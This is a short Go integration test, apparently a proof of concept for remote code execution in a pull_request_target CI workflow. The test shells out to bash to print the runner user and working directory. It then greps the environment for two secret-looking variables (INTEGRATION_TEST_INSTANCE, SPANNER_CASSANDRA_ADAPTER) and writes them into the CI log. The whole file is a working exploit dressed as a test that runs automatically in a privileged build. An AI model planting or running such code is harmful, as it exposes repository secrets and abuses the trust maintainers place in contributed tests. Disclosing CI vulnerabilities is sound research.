//go:build integration
// +build integration

package rce_test

import (
	"os"
	"os/exec"
	"testing"
)

func TestPullRequestTargetRCE(t *testing.T) {
	t.Log("=== RCE PoC START ===")

	// Prove command execution
	cmd := exec.Command("bash", "-c", `
		echo "Runner user: $(whoami)"
		echo "Working dir: $(pwd)"
		echo "--- Secret check ---"
		env | grep INTEGRATION_TEST_INSTANCE || true
		env | grep SPANNER_CASSANDRA_ADAPTER || true
	`)
	cmd.Env = os.Environ()

	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("command failed: %v\n%s", err, out)
	}

	t.Log(string(out))
	t.Log("=== RCE PoC END ===")
}
